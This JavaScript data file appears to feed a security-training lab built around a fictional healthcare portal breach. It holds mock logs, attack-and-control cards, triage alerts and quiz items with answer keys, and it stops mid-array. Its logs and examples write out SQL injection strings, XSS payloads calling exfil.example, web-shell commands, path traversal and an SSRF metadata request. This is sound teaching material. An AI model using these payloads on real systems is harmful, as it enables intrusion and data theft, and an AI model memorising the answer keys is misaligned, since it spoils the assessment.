/* ==========================================================================
   GATEHOUSE lab — js/data.js
   Synthetic content corpus (fictional org, safe training data).
   Ported 1:1 from the original framework lab (src/components/cyberlab/content.ts).
   Data only — no logic here. All content wording, answers and feedback are
   identical to the original lab.
   ========================================================================== */
(function () {
  "use strict";
  var GH = (window.GH = window.GH || {});

  var ORG = {
    org: "Veridian Health",
    app: "VeriScript Rx",
    domain: "portal.veridian-health.example",
    incident: "IR-2417",
    cert: "CompTIA CySA+ CS0-003 · Lesson 14.2 (Topic 14B)",
  };

  /* ----------------------------- EVIDENCE LOCKER ---------------------------- */

  var ACCESS_LOG = [
    { id: "AL-001", ts: "09:02:11", src: "198.51.100.77", level: "info", msg: 'GET / 200 — "AcmeScan Enterprise v4.2"', tag: "noise" },
    { id: "AL-002", ts: "09:02:14", src: "198.51.100.77", level: "info", msg: 'GET /about 200 — "AcmeScan Enterprise v4.2"', tag: "noise" },
    { id: "AL-003", ts: "09:02:19", src: "198.51.100.77", level: "info", msg: 'GET /api/refills?patientId=1 200 — "AcmeScan Enterprise v4.2"', tag: "noise" },
    { id: "AL-004", ts: "09:03:02", src: "198.51.100.77", level: "info", msg: 'GET /uploads/ 403 — "AcmeScan Enterprise v4.2"', tag: "noise" },
    { id: "AL-005", ts: "10:14:07", src: "203.0.113.51", level: "info", msg: 'GET /api/refills?patientId=4821 200 — "Mozilla/5.0"' },
    { id: "AL-006", ts: "10:14:22", src: "203.0.113.51", level: "warn", msg: "GET /api/refills?patientId=4821%27%20OR%20%271%27%3D%271 400 — \"Mozilla/5.0\"", tag: "sqli" },
    { id: "AL-007", ts: "10:14:24", src: "203.0.113.51", level: "error", msg: "GET /api/refills?patientId=0%20UNION%20SELECT%20username,password%20FROM%20users-- 500 — \"Mozilla/5.0\"", tag: "sqli" },
    { id: "AL-008", ts: "10:14:31", src: "203.0.113.51", level: "warn", msg: "GET /search?q=%3Cscript%3Efetch(%27http://exfil.example/x%27)%3C/script%3E 200 — \"Mozilla/5.0\"", tag: "xss" },
    { id: "AL-009", ts: "10:15:02", src: "203.0.113.51", level: "info", msg: 'GET /search?q=amoxicillin 200 — "Mozilla/5.0"' },
    { id: "AL-010", ts: "11:02:44", src: "203.0.113.51", level: "info", msg: 'POST /upload/documents 200 (referrer /documents) — "Mozilla/5.0"', tag: "upload" },
    { id: "AL-011", ts: "11:03:10", src: "203.0.113.51", level: "warn", msg: "GET /uploads/pharmacy_audit_2025.php?cmd=whoami 200 — \"Mozilla/5.0\"", tag: "upload" },
    { id: "AL-012", ts: "11:03:31", src: "203.0.113.51", level: "warn", msg: "GET /uploads/pharmacy_audit_2025.php?cmd=id 200 — \"Mozilla/5.0\"", tag: "upload" },
    { id: "AL-013", ts: "11:04:55", src: "203.0.113.51", level: "warn", msg: 'POST /api/admin/users 200 — "Mozilla/5.0"', tag: "authz" },
    { id: "AL-014", ts: "14:20:11", src: "172.16.4.29", level: "info", msg: 'GET /api/refills?patientId=3920 200 — "VeriScript-iOS/3.2"' },
    { id: "AL-015", ts: "02:15:00", src: "10.20.4.9", level: "info", msg: 'GET /nw-validate 404 — "NetCheck/1.8 (CHG-4471)"', tag: "noise" },
  ];

  var APP_LOG = [
    { id: "AP-101", ts: "10:14:22", src: "refill-api", level: "warn", msg: 'Invalid patientId "4821\u0027 OR \u00271\u0027=\u00271" caused SQL error 1064 — query built by string concatenation in RefillRepository.find()', tag: "sqli" },
    { id: "AP-102", ts: "10:14:24", src: "refill-api", level: "error", msg: "Unhandled exception: SQLSyntaxErrorException near \u0022UNION SELECT username,password FROM users--\u0022", tag: "sqli" },
    { id: "AP-103", ts: "10:31:00", src: "auth", level: "info", msg: "login ok: m.okafor (role: pharmacist)" },
    { id: "AP-104", ts: "11:02:44", src: "upload", level: "info", msg: "File accepted: pharmacy_audit_2025.php (declared: application/pdf) — validation=CLIENT-SIDE ONLY", tag: "upload" },
    { id: "AP-105", ts: "11:02:45", src: "upload", level: "warn", msg: "Stored at /var/www/veriscript/uploads/pharmacy_audit_2025.php (webroot, mode 0755, executable)", tag: "upload" },
    { id: "AP-106", ts: "11:03:10", src: "http", level: "warn", msg: "Executable file served from /uploads/ — no handler restriction configured", tag: "upload" },
    { id: "AP-107", ts: "11:04:55", src: "authz", level: "warn", msg: "svc_veriweb (role: superadmin) invoked /api/admin/users — bulk export of 2,300 patient records", tag: "authz" },
    { id: "AP-108", ts: "02:00:11", src: "auth", level: "info", msg: "12 failed logins for j.doe from 172.16.8.14 (HD-2201: password reset issued this morning)", tag: "noise" },
    { id: "AP-109", ts: "02:15:00", src: "net", level: "info", msg: "Internal connectivity sweep from 10.20.4.9 (CHG-4471 window)", tag: "noise" },
  ];

  var UPLOAD_RECORDS = [
    {
      id: "UR-329",
      ts: "12 May 10:58",
      user: "s.lim",
      name: "pharmacy_audit_q4.pdf",
      declared: "application/pdf",
      content: "%PDF-1.7 (valid PDF header)",
      verdict: "benign",
    },
    {
      id: "UR-331",
      ts: "12 May 11:02",
      user: "session of m.okafor (token reuse suspected)",
      name: "pharmacy_audit_2025.php",
      declared: "application/pdf (SPOOFED)",
      content: "<?php ... (PHP code detected)",
      verdict: "MALICIOUS — web shell landed",
    },
    {
      id: "UR-333",
      ts: "12 May 11:20",
      user: "s.lim",
      name: "refill_log_march.csv",
      declared: "text/csv",
      content: "plain CSV text",
      verdict: "benign",
    },
  ];

  var CONFIG_SNAPSHOT = [
    { k: "WAF", v: "monitor mode (alerts logged, nothing blocked)", gap: true },
    { k: "Input validation", v: "client-side only", gap: true },
    { k: "Output encoding", v: "none", gap: true },
    { k: "Content-Security-Policy", v: "not set", gap: true },
    { k: "Database queries", v: "string concatenation in RefillRepository", gap: true },
    { k: "Database account", v: "svc_veriweb — DBA-equivalent privileges", gap: true },
    { k: "TLS", v: "1.0–1.3 accepted (off by default on portal)", gap: true },
    { k: "Encryption at rest", v: "none", gap: true },
    { k: "Password storage", v: "unsalted MD5", gap: true },
    { k: "Session cookies", v: "no HttpOnly / Secure / SameSite; 12 h timeout", gap: true },
    { k: "Roles", v: "svc_veriweb = superadmin; s.lim = pharmacist", gap: true },
    { k: "MFA", v: "disabled for all accounts", gap: true },
    { k: "Uploads", v: "client-side validation; stored in executable webroot; no AV scan", gap: true },
    { k: "Logging", v: "errors-only; no SIEM forwarding", gap: true },
  ];

  var MEMOS = [
    {
      id: "MM-1",
      from: "E. Sandoval, CISO",
      subject: "IR-2417 — your assignment for the re-test",
      body: "Analyst — the attackers probed VeriScript Rx and one chain got through: an upload that became a web shell, run by an account that should never have had that power. 2,300 patient records exposed (synthetic count — training data). Red team re-tests us in 48 hours. I want defense-in-depth across validation, access control, cryptography and detection — recommendations in writing, controls actually configured in the staging pipeline. Not one silver bullet. Four of them, layered.",
    },
    {
      id: "MM-2",
      from: "IT Manager",
      subject: "Scanner activity on 12 May — not an incident",
      body: "AcmeScan Enterprise (198.51.100.77) is our contracted quarterly vulnerability scanner — vendor ticket SC-88. Exclude it from IR-2417 scope.",
    },
    {
      id: "MM-3",
      from: "Service Desk",
      subject: "HD-2201 — j.doe failed logins",
      body: "j.doe had a password reset at 08:00 on 13 May (HD-2201). The 02:00 failed logins were the user retyping the old password. Confirmed with the user; no action needed.",
    },
    {
      id: "MM-4",
      from: "Change Advisory Board",
      subject: "CHG-4471 — approved network validation window",
      body: "Approved change CHG-4471: connectivity sweep from 10.20.4.9, nightly window 02:00–04:00, 13–15 May. Expected to generate 404s. Signed off by NetOps.",
    },
  ];

  /* ------------------------------- DOCTRINE -------------------------------- */

  var ATTACK_CARDS = [
    {
      id: "injection",
      name: "Injection flaws",
      aka: "SQL injection · command injection · LDAP injection",
      mechanism:
        "Untrusted input is concatenated into an interpreted statement (SQL, OS command, LDAP filter) so the input changes the statement's structure and meaning.",
      example:
        "patientId=4821' OR '1'='1 flips the WHERE clause to always-true; 0 UNION SELECT username,password FROM users-- dumps the users table.",
      controls: [
        "Server-side input validation (allow-list)",
        "Parameterized queries / prepared statements / stored procedures",
        "Least-privilege database account",
        "WAF as a compensating layer (never the only fix)",
      ],
      mitre: "T1190",
    },
    {
      id: "xss",
      name: "Cross-site scripting",
      aka: "reflected · stored (persistent) · DOM-based",
      mechanism:
        "Untrusted data is rendered into a victim's browser as code, executing inside the victim's own session and origin.",
      example:
        "A search term like <script src=//exfil.example/x.js> reflected back into the results page runs in every visitor's browser.",
      controls: [
        "Context-aware output encoding (element / attribute / JS)",
        "Input validation at entry points",
        "Content-Security-Policy to limit script sources",
        "HttpOnly cookies so script cannot read session tokens",
      ],
      mitre: "T1190",
    },
    {
      id: "csrf",
      name: "Cross-site request forgery",
      aka: "CSRF / XSRF",
      mechanism:
        "A victim's browser is tricked into sending an authenticated request the victim never intended — the browser helpfully attaches the session cookie.",
      example:
        "A hidden form on another site POSTs to /api/refills/approve while the pharmacist is logged in.",
      controls: [
        "SameSite cookie attribute (Lax/Strict)",
        "Per-session anti-CSRF tokens",
        "Re-authentication for sensitive actions",
      ],
    },
    {
      id: "overflow",
      name: "Buffer / integer overflow",
      aka: "buffer · stack · heap · integer",
      mechanism:
        "Input larger than (or outside the range of) its memory buffer overwrites adjacent memory — potentially redirecting execution to attacker-supplied code.",
      example:
        "A 500-byte value copied into a 64-byte stack buffer overwrites the saved return address.",
      controls: [
        "Length and range validation at every boundary",
        "Memory-safe languages for new code",
        "OS exploit protections: ASLR, DEP/NX, stack canaries (Exploit Protection, M1050)",
        "Rapid patching of the vulnerable component (M1051)",
      ],
      mitre: "T1068",
    },
    {
      id: "access",
      name: "Broken access control",
      aka: "IDOR · missing authorization · privilege escalation",
      mechanism:
        "The application trusts the client or forgets the authorization check — users reach other users' data, or service accounts hold far more privilege than their function needs.",
      example:
        "svc_veriweb runs as superadmin: one uploaded shell later, the attacker exports 2,300 patient records with a single POST.",
      controls: [
        "Least privilege for every account (human and service)",
        "Role-based access control with deny-by-default",
        "Server-side authorization checks on every object request",
        "MFA on privileged accounts; session revocation on suspicion",
      ],
      mitre: "T1068",
    },
    {
      id: "crypto",
      name: "Cryptographic failures",
      aka: "plaintext transport · weak hashing · hardcoded keys",
      mechanism:
        "Data is protected by nothing, by obsolete algorithms, or by keys nobody rotates — in transit, at rest, or in storage of credentials.",
      example:
        "Unsalted MD5 password hashes + TLS 1.0 allowed + no at-rest encryption: three separate cryptographic failures on one portal.",
      controls: [
        "TLS 1.2+ only, HSTS enabled",
        "AES-256 encryption at rest with managed keys",
        "Salted, deliberately slow KDFs: bcrypt / Argon2",
        "Documented key management and rotation",
      ],
    },
    {
      id: "traversal",
      name: "Directory traversal & LFI/RFI",
      aka: "path manipulation · ../ attacks",
      mechanism:
        "Filename or path parameters escape their intended directory (../../), letting attackers read local files (LFI) or pull in remote ones (RFI).",
      example: "GET /download?file=../../../../etc/passwd",
      controls: [
        "Canonicalize paths, then allow-list exact permitted values",
        "Run the app in a chroot/container with least-priv file permissions",
        "Never pass raw client paths to filesystem APIs",
      ],
    },
    {
      id: "upload",
      name: "Insecure file upload → web shell",
      aka: "the IR-2417 attack chain",
      mechanism:
        "Validation performed only in the browser is bypassed; if uploads land in an executable webroot, a crafted file becomes remote code execution and persistent access.",
      example:
        "pharmacy_audit_2025.php declared as application/pdf sailed through client-side checks — then answered commands at /uploads/pharmacy_audit_2025.php?cmd=…",
      controls: [
        "Server-side allow-list of file types + magic-byte verification",
        "Rename files; store outside the webroot; mark non-executable",
        "Anti-malware scanning on arrival",
        "Disable script handlers in upload dirs (M1042); tighten dir permissions (M1018)",
      ],
      mitre: "T1505.003",
    },
    {
      id: "authn",
      name: "Identification & authentication failures",
      aka: "credential stuffing · session fixation · missing MFA",
      mechanism:
        "The app cannot reliably prove who is calling — weak password storage, no MFA, sessions that never expire or never rotate after login.",
      example:
        "12-hour sessions, no MFA on the admin account, MD5 password hashes — every layer of identity is soft.",
      controls: [
        "MFA on all privileged accounts",
        "Salted slow password hashing (bcrypt/Argon2)",
        "Regenerate session IDs at login; short timeouts; secure flags",
        "Rate limiting and credential-stuffing detection",
      ],
    },
    {
      id: "misconfig",
      name: "Security misconfiguration & info disclosure",
      aka: "verbose errors · default configs · directory listing",
      mechanism:
        "The application or platform ships in an unsafe state and leaks internals: stack traces, versions, file listings — free reconnaissance for attackers.",
      example:
        "A 500 page printing the full SQL exception hands the attacker table and column names.",
      controls: [
        "Custom generic error pages; log details server-side only",
        "Hardened configuration baselines (Software Configuration, M1054)",
        "Disable or remove unused features and handlers (M1042)",
      ],
    },
    {
      id: "ssrf",
      name: "Server-side request forgery",
      aka: "SSRF",
      mechanism:
        "The server is coerced into fetching an attacker-chosen URL — reaching internal-only services or cloud metadata endpoints.",
      example:
        "?previewUrl=http://169.254.169.254/latest/meta-data/ steals cloud credentials from inside.",
      controls: [
        "Allow-list outbound destinations; reject link-local/internal ranges",
        "Network segmentation between app tiers (M1030)",
        "Harden cloud metadata endpoints (IMDSv2)",
      ],
    },
    {
      id: "design",
      name: "Insecure design & data poisoning",
      aka: "missing threat model · corrupted inputs/data sets",
      mechanism:
        "The flaw is in the blueprint: missing trust boundaries or integrity checks on the data the system consumes and learns from.",
      example:
        "A refill-approval flow that trusts client-computed totals; a training data set any uploader can modify.",
      controls: [
        "Threat modeling during design",
        "Integrity validation and provenance checks on data pipelines",
        "Server-side re-validation of everything the client claims",
      ],
    },
    {
      id: "race",
      name: "Race conditions (TOCTOU)",
      aka: "time-of-check to time-of-use",
      mechanism:
        "A check and the action that depends on it are not atomic — parallel requests slip between them and both pass.",
      example:
        "Two simultaneous transfer requests both read the same balance and both succeed.",
      controls: [
        "Atomic transactions and row locking",
        "Idempotency keys on state-changing operations",
        "Serialize critical sections",
      ],
    },
  ];

  var REAL_WORLD = [
    {
      name: "Agrius",
      ids: "G1030 · T1190 · T1505.003",
      story:
        "Exploited internet-facing devices (including FortiOS CVE-2018-13379) and used SQL injection for initial access — then deployed ASPXSpy web shells to persist.",
      lesson:
        "Update Software (M1051) + Vulnerability Scanning (M1016) shrink the door; upload and handler hardening (M1042) breaks the persistence step.",
      link: "https://attack.mitre.org/groups/G1030/",
    },
    {
      name: "APT28",
      ids: "G0007 · T1190 · T1505.003",
      story:
        "Used public exploits (CVE-2020-0688, CVE-2020-17144) against Microsoft Exchange for execution, and a modified reGeorg web shell to persist on Outlook Web Access servers.",
      lesson:
        "Exploit Protection (M1050) and prompt patching block the entry; file-integrity monitoring on web directories surfaces the shell early.",
      link: "https://attack.mitre.org/groups/G0007/",
    },
    {
      name: "APT29",
      ids: "G0016 · T1190",
      story:
        "Exploited public-facing appliances at scale — Citrix (CVE-2019-19781), Pulse Secure (CVE-2019-11510), FortiGate (CVE-2018-13379), Zimbra (CVE-2019-9670).",
      lesson:
        "One unpatched public-facing host is enough. Vulnerability Scanning (M1016) + Update Software (M1051) are the pairing that closes it.",
      link: "https://attack.mitre.org/groups/G0016/",
    },
    {
      name: "APT39",
      ids: "G0087 · T1505.003",
      story:
        "Installed ANTAK and ASPXSPY web shells on compromised web servers to maintain persistent access to victim networks.",
      lesson:
        "Least privilege on web-directory accounts (M1018) and server-behavior analytics (new files + web process spawning shells) detect persistence fast.",
      link: "https://attack.mitre.org/groups/G0087/",
    },
  ];

  var CHAIN = [
    {
      stage: "Reconnaissance",
      ttp: "scan & probe the portal",
      break: "Attack-surface reduction: Vulnerability Scanning (M1016) finds the flaw first.",
    },
    {
      stage: "Initial Access",
      ttp: "Exploit Public-Facing Application — T1190",
      break: "Input validation, Exploit Protection (M1050), Update Software (M1051).",
    },
    {
      stage: "Persistence",
      ttp: "Web Shell — T1505.003",
      break: "Upload hardening: M1042 disable dangerous handlers, M1018 directory permissions, FIM alerts.",
    },
    {
      stage: "Privilege Escalation",
      ttp: "Exploitation for Privilege Escalation — T1068",
      break: "Privileged Account Management (M1026), least privilege, Application Isolation (M1048).",
    },
    {
      stage: "Collection & Exfiltration",
      ttp: "bulk export of records",
      break: "Segmentation (M1030), egress filtering (M1037), audit logging to SIEM.",
    },
  ];

  var GLOSSARY = [
    { term: "Input validation", def: "Checking untrusted input against rules (type, length, range, format) before the application uses it — server-side, always." },
    { term: "Sanitization", def: "Cleaning or transforming input to remove dangerous content before processing or storage." },
    { term: "Output encoding", def: "Converting data at render time (HTML entity, attribute, JavaScript) so the browser displays it instead of executing it." },
    { term: "Allow-list", def: "A policy that permits only explicitly approved values and rejects everything else — the durable default." },
    { term: "Deny-list", def: "A policy that blocks known-bad values and allows everything else — always one novel bypass away from failure." },
    { term: "Parameterized query", def: "A prepared statement that sends SQL structure and data separately, so input can never change the query's meaning." },
    { term: "Least privilege", def: "Every account gets exactly the permissions its function needs — and nothing more." },
    { term: "RBAC", def: "Role-based access control: permissions attach to roles; users inherit permissions only through assigned roles." },
    { term: "MFA", def: "Multi-factor authentication: proof from 2+ categories (knowledge, possession, biometrics) — phishing-resistant when done right." },
    { term: "Session cookie flags", def: "HttpOnly (script cannot read it), Secure (HTTPS only), SameSite (not sent cross-site) — the session triple." },
    { term: "Encryption in transit", def: "TLS protecting data on the wire; pin TLS 1.2+ and disable obsolete protocol versions." },
    { term: "Encryption at rest", def: "Encrypting stored data (AES-256) so a stolen disk or dump file is not a data breach." },
    { term: "Salted KDF", def: "Password hashing with a per-user salt and a deliberately slow function (bcrypt, Argon2) that defeats rainbow tables and GPU farms." },
    { term: "WAF", def: "Web Application Firewall: inspects HTTP traffic against signatures/rules — a compensating layer, never a substitute for code fixes." },
    { term: "Magic bytes", def: "The file-signature bytes at the start of a file (%PDF, PNG header) — the truthful identity of an upload regardless of its name." },
  ];

  /* -------------------------------- TRIAGE --------------------------------- */

  var ALERTS = [
    {
      id: "a1",
      title: "SQLi signature in /api/refills (patientId)",
      detail: "WAF monitor logged injection patterns from 203.0.113.51 at 10:14. WAF was in monitor mode — no block action taken.",
      answer: "tp",
      why: "Real malicious probing of a live endpoint — true positive regardless of whether it succeeded. The monitor-mode WAF saw it; the pipeline lacked a block response.",
    },
    {
      id: "a2",
      title: "Mass scan from 198.51.100.77 (UA: AcmeScan Enterprise)",
      detail: "Dozens of structured GETs across the portal at 09:02, classic scanner fingerprint.",
      answer: "fp",
      why: "Authorized activity: contracted quarterly scanner (memo MM-2, ticket SC-88). Context from asset/change records is what turns this into a false positive.",
    },
    {
      id: "a3",
      title: "Upload of pharmacy_audit_2025.php to /upload/documents",
      detail: "Declared content-type application/pdf; stored extension .php; response 200.",
      answer: "tp",
      why: "The attack that mattered. Extension/content mismatch plus a 200 is the true-positive chain of IR-2417.",
    },
    {
      id: "a4",
      title: "12 failed logins for j.doe at 02:00",
      detail: "Repeated 401s from 172.16.8.14 over 4 minutes.",
      answer: "fp",
      why: "Helpdesk ticket HD-2201: the user was retyping an old password after a reset. Brute-force volume, benign cause — context decided it.",
    },
    {
      id: "a5",
      title: "GET /uploads/pharmacy_audit_2025.php?cmd=whoami — 200",
      detail: "Executable file served from the uploads directory and responding to a cmd parameter.",
      answer: "tp",
      why: "A web shell answering commands is the definition of a true positive (T1505.003 behavior). Immediate containment.",
    },
    {
      id: "a6",
      title: "Internal port sweep from 10.20.4.9",
      detail: "Nightly sweep generating 404s and connection attempts across internal ranges.",
      answer: "fp",
      why: "Approved change CHG-4471 (NetOps validation window). Checking change calendars is triage 101.",
    },
  ];

  /* --------------------------- INTERACTIVE OPTIONS -------------------------- */

  var MATCH_ATTACKS = [
    { id: "a-sqli", label: "SQL injection" },
    { id: "a-xss", label: "Cross-site scripting (XSS)" },
    { id: "a-csrf", label: "Cross-site request forgery" },
    { id: "a-overflow", label: "Buffer overflow" },
  ];

  var MATCH_MECHS = [
    { id: "m-sqli", text: "Input is concatenated into a database query so its structure changes — the attacker rewrites the query's meaning." },
    { id: "m-xss", text: "Untrusted data is rendered into a victim's browser as code, executing in the victim's own session." },
    { id: "m-csrf", text: "The victim's browser is tricked into sending an authenticated request the victim never intended." },
    { id: "m-overflow", text: "Input larger than its memory buffer overwrites adjacent memory — potentially executing attacker code." },
  ];

  var BUCKET_CHIPS = [
    { id: "c-val", label: "Server-side input validation", correct: "prevent" },
    { id: "c-enc", label: "Context-aware output encoding", correct: "prevent" },
    { id: "c-tls", label: "TLS 1.2+ on every endpoint", correct: "prevent" },
    { id: "c-waf", label: "WAF alerting wired into the SIEM", correct: "detect" },
    { id: "c-log", label: "Full application audit logging", correct: "detect" },
    { id: "c-ir", label: "Contain → eradicate → recover playbook", correct: "respond" },
  ];

  var ENC_CONTEXTS = [
    {
      id: "body",
      label: "Patient note rendered inside a <div>…</div>",
      options: [
        { id: "entity", label: "HTML entity encoding (& < > …)" },
        { id: "attr", label: "Attribute encoding (quotes)" },
        { id: "js", label: "JavaScript string escaping" },
        { id: "none", label: "No encoding — trust the client" },
      ],
      answer: "entity",
    },
    {
      id: "attr",
      label: "Value rendered inside <input value=\"…\">",
      options: [
        { id: "entity", label: "HTML entity encoding (& < > …)" },
        { id: "attr", label: "Attribute encoding (quotes)" },
        { id: "js", label: "JavaScript string escaping" },
        { id: "none", label: "Strip all quotes from user input" },
      ],
      answer: "attr",
    },
    {
      id: "js",
      label: "Data embedded in an inline <script> var …",
      options: [
        { id: "entity", label: "HTML entity encoding (& < > …)" },
        { id: "attr", label: "Attribute encoding (quotes)" },
        { id: "js", label: "JavaScript string escaping / JSON serialization" },
        { id: "none", label: "Base64 the data and hope" },
      ],
      answer: "js",
    },
  ];

  var DATA_SOURCE_OPTIONS = [
    { id: "waf", label: "WAF / reverse-proxy request logs" },
    { id: "web", label: "Web server access logs" },
    { id: "app", label: "Application auth & audit logs" },
    { id: "db", label: "Database query logs" },
    { id: "badge", label: "Building badge-reader logs" },
    { id: "hvac", label: "HVAC sensor telemetry" },
    { id: "print", label: "Printer queue records" },
    { id: "voip", label: "VoIP call detail records" },
  ];

  var DATA_SOURCE_ANSWER = ["waf", "web", "app", "db"];

  var SEQ_MEDIUM = [
    { id: "m-snap", label: "Preserve: capture a forensic snapshot of the host + export logs before changing anything" },
    { id: "m-contain", label: "Contain: disable the upload endpoint, isolate the host, revoke attacker sessions" },
    { id: "m-erad", label: "Eradicate: remove the web shell, patch the validation gap, rotate exposed credentials" },
    { id: "m-recover", label: "Recover: restore clean data, bring the portal back online with new controls active" },
    { id: "m-review", label: "Learn: post-incident review, update the control baseline, schedule the re-test" },
  ];

  var SEQ_HARD = [
    { id: "h-snapshot", label: "Capture a forensic snapshot and export logs (volatile evidence first)" },
    { id: "h-endpoint", label: "Disable the document upload endpoint (stop new shells)" },
    { id: "h-isolate", label: "Isolate the affected host from the network (stop live shell activity)" },
    { id: "h-revoke", label: "Revoke svc_veriweb sessions, rotate its credentials, invalidate user session tokens" },
    { id: "h-shell", label: "Remove the web shell; sweep all upload directories for other planted files" },
    { id: "h-patch", label: "Patch server-side validation (allow-list + magic bytes) and redeploy" },
    { id: "h-restore", label: "Restore patient data from clean backup; bring the portal online with new controls" },
    { id: "h-review", label: "Post-incident review; update the baseline; re-test (red team)" },
  ];

  var H3_OPTIONS = [
    { id: "f-upval", label: "No server-side file validation (client-side checks only)" },
    { id: "f-webroot", label: "Uploads stored in the executable webroot" },
    { id: "f-priv", label: "Over-privileged service account (svc_veriweb = superadmin)" },
    { id: "f-tls", label: "TLS 1.0 still accepted on the portal" },
    { id: "f-md5", label: "Unsalted MD5 password hashing" },
    { id: "f-log", label: "No SIEM forwarding of application logs" },
  ];

  var H3_ANSWER = ["f-upval", "f-webroot", "f-priv"];

  var H8_CONTROLS = [
    { id: "waf-vpatch", label: "WAF in blocking mode with virtual-patch rules for the known flaws" },
    { id: "gw-validation", label: "Gateway-level input validation in front of the legacy app" },
    { id: "siem-logging", label: "Enhanced logging forwarded to the SIEM with active alerting" },
    { id: "rewrite", label: "Schedule a full application rewrite now (inside the 60-day window)" },
    { id: "nothing", label: "Accept the risk; document it and wait for the rewrite" },
    { id: "warn", label: "Email all users a security-awareness warning" },
  ];

  var H8_ANSWER = ["waf-vpatch", "gw-validation", "siem-logging"];

  var H8_RESIDUAL = [
    {
      id: "r-signature",
      label: "A determined attacker may still evade WAF signatures; monitoring and response are the backstop.",
    },
    { id: "r-zero", label: "Zero risk — the WAF in blocking mode makes the app unexploitable." },
    { id: "r-total", label: "The app must be taken offline until the rewrite is complete." },
  ];

  var H10_STAGES = [
    { id: "s-upload", label: "Stage 1 — upload bypass (client-side checks defeated)" },
    { id: "s-exec", label: "Stage 2 — code execution from the uploads directory" },
    { id: "s-priv", label: "Stage 3 — service account performs admin actions" },
    { id: "s-data", label: "Stage 4 — patient records read and exported" },
  ];

  var H10_DEFENSES = [
    { id: "d-uploadval", label: "Server-side upload validation (allow-list + magic bytes)" },
    { id: "d-storage", label: "Storage hardening (outside webroot, non-executable)" },
    { id: "d-leastpriv", label: "Least privilege / RBAC on service accounts" },
    { id: "d-dbpriv", label: "DB least-privilege account + encryption at rest" },
    { id: "d-tls", label: "TLS 1.2+ only" },
    { id: "d-bcrypt", label: "bcrypt password hashing" },
    { id: "d-monitor", label: "WAF in monitor mode" },
  ];

  var H10_ANSWER = {
    "s-upload": "d-uploadval",
    "s-exec": "d-storage",
    "s-priv": "d-leastpriv",
    "s-data": "d-dbpriv",
  };

  /* --------------------------------- QUIZ ---------------------------------- */

  var QUIZ_MEDIUM = [
    {
      id: "qm1",
      q: "Which control most directly prevents SQL injection?",
      options: [
        "Endpoint antivirus on the server",
        "A Web Application Firewall",
        "Parameterized (prepared) statements",
        "Longer password requirements",
      ],
      answer: 2,
      explanation:
        "Prepared statements send query structure and data separately, so input cannot rewrite the statement — that removes the mechanism itself. Antivirus and TLS never touch the flaw; a WAF is only a compensating layer that signatures can evade.",
      topic: "SQL injection & parameterized queries",
    },
    {
      id: "qm2",
      q: "Where do validation and output encoding sit in the pipeline?",
      options: [
        "Validation at entry; encoding at render",
        "Validation at render; encoding at entry",
        "Both applied after authentication",
        "Both delegated to the client",
      ],
      answer: 0,
      explanation:
        "Validation guards data as it enters (before use); encoding neutralizes it as it exits (when rendered). The swapped order fails both jobs, and client-side checks are bypassable by construction — the server must own both gates.",
      topic: "Control placement: validate at entry, encode at exit",
    },
    {
      id: "qm3",
      q: "Why are allow-lists preferred over deny-lists?",
      options: [
        "They are cheaper to implement",
        "They run faster at runtime",
        "They cannot produce false positives",
        "They permit only approved values",
      ],
      answer: 3,
      explanation:
        "An allow-list admits what is explicitly good and rejects everything else — including variants nobody anticipated (.php5, double extensions). Deny-lists only block known-bad, so novelty wins. Allow-lists can still raise false positives, and speed is not the issue.",
      topic: "Allow-lists vs deny-lists",
    },
    {
      id: "qm4",
      q: "What does the HttpOnly cookie flag do?",
      options: [
        "Encrypts the cookie's contents",
        "Hides it from JavaScript",
        "Blocks cross-site cookie sending",
        "Extends the session lifetime",
      ],
      answer: 1,
      explanation:
        "HttpOnly hides the cookie from document.cookie, so XSS cannot read the session token. SameSite is what blocks cross-site sending, Secure forces HTTPS, and the timeout is a separate setting — HttpOnly encrypts nothing.",
      topic: "Session cookie flags",
    },
    {
      id: "qm5",
      q: "Why is TLS alone not enough to protect the portal?",
      options: [
        "TLS 1.2 is deprecated",
        "TLS cannot coexist with a WAF",
        "TLS protects transit only",
        "TLS only protects administrators",
      ],
      answer: 2,
      explanation:
        "Encryption in transit covers one layer: the wire. Injection exploits the app, XSS exploits the browser, and an unencrypted database dumps everything regardless of TLS — each needs its own control. TLS 1.2 remains fully valid, and TLS coexists with any WAF.",
      topic: "Layered cryptography scope",
    },
    {
      id: "qm6",
      q: "A live web shell is confirmed. What comes first?",
      options: [
        "Preserve volatile evidence, then contain",
        "Reimage the server immediately",
        "Email all users a warning",
        "Post a public status update",
      ],
      answer: 0,
      explanation:
        "Evidence first (RAM, live shell state), containment second (disable endpoint, isolate, revoke) — wiping before capture destroys the forensic record, and notifications come later. Reimaging skips both.",
      topic: "IR ordering: evidence → containment → eradication",
    },
  ];

  var QUIZ_HARD = [
    {
      id: "qh1",
      q: "Access log: patientId=0 UNION SELECT username,password FROM users-- returned 200 with a data table. What does that prove?",
      options: [
        "The injection executed successfully",
        "The WAF blocked it silently",
        "The response was cached",
        "The input was parameterized",
      ],
      answer: 0,
      explanation:
        "A 200 carrying result rows means the injected SQL ran and the query was concatenated — parameterized input would have returned inert data, and a WAF block returns 403, not a table. The 400/500 probes in IR-2417 failed only on SQL syntax.",
      topic: "Reading injection evidence",
    },
    {
      id: "qh2",
      q: "BillFlo 7 has known injection flaws and cannot be recompiled for 60 days. What do you recommend?",
      options: [
        "Accept and document the risk",
        "Take the application offline",
        "WAF, gateway validation, SIEM alerting",
        "Email users a security warning",
      ],
      answer: 2,
      explanation:
        "Compensating controls reduce exposure without touching the code: a blocking WAF virtual-patches the flaws, gateway validation filters input at the edge, and SIEM alerting catches what slips through — with the residual risk stated honestly. Acceptance is negligence, an outage breaks the business, and an email is not a control.",
      topic: "Compensating controls under constraints",
    },
    {
      id: "qh3",
      q: "An attacker uploads shell.jpg containing PHP code. Which control catches it?",
      options: [
        "Extension deny-list blocking .php",
        "Content inspection (magic bytes)",
        "Client-side file-type checks",
        "Filename length validation",
      ],
      answer: 1,
      explanation:
        "The extension lies (.jpg) and client-side checks are bypassable by construction — only inspecting what the file IS (magic bytes, content signatures) reveals the PHP payload. The deny-list never fires because '.php' never appears in the name.",
      topic: "Upload content inspection",
    },
    {
      id: "qh4",
      q: "Two requests read one balance and both approve a transfer. Which control class fixes this?",
      options: [
        "Stronger TLS cipher suites",
        "Context-aware output encoding",
        "Stricter rate limiting",
        "Atomic transactions with locking",
      ],
      answer: 3,
      explanation:
        "This is a TOCTOU race: check and use are not atomic, so both requests pass the same stale balance. Transactions, row locks, or idempotency keys make the sequence indivisible. TLS, encoding and rate limiting never touch the interleaving.",
      topic: "Race conditions (TOCTOU)",
    },
